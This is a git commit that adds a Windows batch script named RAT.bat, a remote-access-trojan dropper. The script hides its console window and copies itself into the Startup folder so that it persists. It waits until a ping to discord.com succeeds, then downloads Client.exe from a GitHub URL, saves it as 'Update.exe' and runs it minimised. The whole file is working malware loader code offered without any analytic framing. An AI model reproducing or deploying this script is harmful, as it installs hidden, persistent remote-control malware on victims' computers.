2c0ac060bc88fadf3d8dd6074cca3db06a26eb2c
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-29 22:41:21 +0300

    Add files via upload

---
+++ Windows/RAT.bat
@@ -0,0 +1,14 @@
+@echo off
+powershell.exe -windowstyle Hidden -command
+title %random%
+copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cd %temp%
+
+:check-internet-connection
+ping discord.com
+IF %ERRORLEVEL% NEQ 0 goto check-internet-connection
+
+if exist Update.exe del Update.exe
+powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/Client.exe -OutFile "Update.exe"
+if exist Update.exe start /min Update.exe
+exit
